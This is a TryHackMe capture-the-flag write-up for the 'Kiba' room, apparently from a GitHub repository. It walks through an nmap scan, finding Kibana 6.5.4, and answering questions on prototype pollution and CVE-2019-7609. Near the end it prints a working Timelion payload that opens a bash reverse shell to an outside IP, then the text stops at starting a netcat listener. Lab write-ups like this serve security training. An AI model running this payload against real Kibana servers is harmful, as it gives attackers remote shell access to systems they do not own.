# kiba

If we try to access kibana through browser by IP address, we won't get direct access. It will display this page :

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/0fa7feb7-4810-44fd-aa97-1530bbab484f)

So through http port we can't get access of kibana. Thus, we will look for open ports of provided IP.

Initiate nmap scan to the provided IP.

`sudo nmap -p- 10.10.174.118`

As we can see the open ports through nmap scan, `5601/tcp` is the `esmagent` of Enterprise Service Management.

Give `<ip>:port` to access kibana. (`10.10.174.118:5601`)

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/7a3aab02-518c-4720-8b2f-4c21bc3bb4fb)

### What is the vulnerability that is specific to programming languages with prototype-based inheritance?

    Prototype Pollution
    
![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/9bc44c56-7662-4b81-8ed3-b32a5dabe88c)

### What is the version of visualization dashboard installed in the server?

    Ver 6.5.4
    
    In Kibana, go to Management tab 
    
    There we can see the Version : 6.5.4 mentioned.
    
![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/1b1b4e75-ccb3-4044-b392-7ee831cad2fe)


### What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

    CVE-2019-7609
    
![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/9bc44c56-7662-4b81-8ed3-b32a5dabe88c)

### Compromise the machine and locate user.txt

https://github.com/mpgn/CVE-2019-7609

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/15fea3fa-b706-4ace-8c9b-1975f37a0eb4)

* This is the link of github repository which consists of the payload to exploit this vulnerability.
* Copy the payload

      .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
      .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
    
* Open `Timelion` in kibana and paste the payload in the provided box.
* Start a netcat listener

